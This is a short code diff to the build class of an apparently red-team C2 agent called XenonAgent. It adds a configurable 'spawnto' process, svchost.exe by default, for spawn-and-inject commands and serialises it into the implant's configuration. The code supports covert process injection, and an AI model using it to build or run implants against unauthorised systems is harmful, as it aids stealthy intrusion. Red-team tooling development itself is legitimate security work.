@@ -25,6 +25,12 @@ class XenonAgent(PayloadType):
     translation_container = "XenonTranslator"
     build_parameters = [
         BuildParameter(
+            name = "spawnto_process",
+            parameter_type=BuildParameterType.String,
+            default_value="C:\\Windows\\System32\\svchost.exe",
+            description="Spawnto Process: Full path of process to use for spawn & inject commands.",
+        ),
+        BuildParameter(
             name = "output_type",
             parameter_type=BuildParameterType.ChooseOne,
             choices=[ "exe", "dll", "shellcode"],
@@ -78,7 +84,6 @@ class XenonAgent(PayloadType):
             "proxy_host": "",
             "proxy_user": "",
             "proxy_pass": "",
-
         }
         stdout_err = ""
         for c2 in self.c2info:
@@ -245,7 +250,9 @@ class XenonAgent(PayloadType):
             serialized_data += serialize_int(domain_rotation_value)
             serialized_data += serialize_int(Config["failover_threshold"])
 
-
+            # Process Injection Settings
+            spawnto_process_path = self.get_parameter('spawnto_process')
+            serialized_data += serialize_string(spawnto_process_path)
 
             # Serialize number of hosts (callback domains)
             num_hosts = len(Config["callback_domains"])
